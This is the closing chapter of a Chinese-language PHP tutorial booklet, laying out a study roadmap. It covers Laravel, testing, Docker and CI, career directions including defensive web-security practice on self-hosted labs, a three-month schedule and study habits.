**第一步：语言深化**。引用与值语义细节、生成器（yield——PHP 也有！）、闭包与 first-class callable、反射、Fibers。书：《Modern PHP》（Josh Lockhart，现代实践总纲）+ PHP 官方文档（php.net 的中文质量很高，每章课后通读对应条目）。

**第二步：框架与工程**。Laravel 全栈（第 12 章路线）→ 数据库迁移/队列/测试（PHPUnit+Pest）→ Docker 容器化部署 → CI（GitHub Actions 跑 phpunit+phpcs）。做一个"博客系统"（文章 CRUD + 评论 + 标签 + 认证 + 分页）作为框架期毕业项目。

**第三步：方向分岔**：

- **Web 后端**：API 设计（REST/OpenAPI）、缓存（Redis）、消息队列、微服务；

- **安全方向**（与本卷第 10 章衔接）：OWASP Top 10 逐项攻防实验（自建 DVWA/bWAPP 靶场）→ Web 渗透测试方法论 → 代码审计（PHP 项目源码审计是安全行业的经典技能：危险函数回溯、注入点分析）——**第 10 章的防御知识正是审计的"反向地图"**；

- **全栈/独立开发**：Laravel + Livewire/Inertia（前后端一体化）、WordPress 生态（插件/主题开发，接活性价比极高）。

**三个月时间表**：第 1 月第 1~7 章（语法+表单）完成每章练习；第 2 月第 8~10 章（会话+数据库+安全）+ 留言板单文件版；第 3 月留言板 MVC 重构 + Laravel Bootcamp + 博客系统部署上线。

**三条持续习惯**：① 读官方文档而非搜索引擎的第一页结果（PHP/Laravel 文档质量过硬）；② 每个"能跑"的小工具都过一遍第 10 章清单（转义了吗？预处理了吗？令牌了吗？）；③ 把安全思维带进任何语言——四大漏洞的原理在 Java/Python/Node 里一字不差。

**最后一句**：PHP 曾被戏称"世界上最好的语言"——玩笑归玩笑，它用三十年的实战教育了一代人什么是 Web、什么是安全。你手里的这本小册子没有背完它的历史，但已经握住了它的现在与未来。

**[▲ 返回目录](#toc)**

---

（完 · Happy PHPing）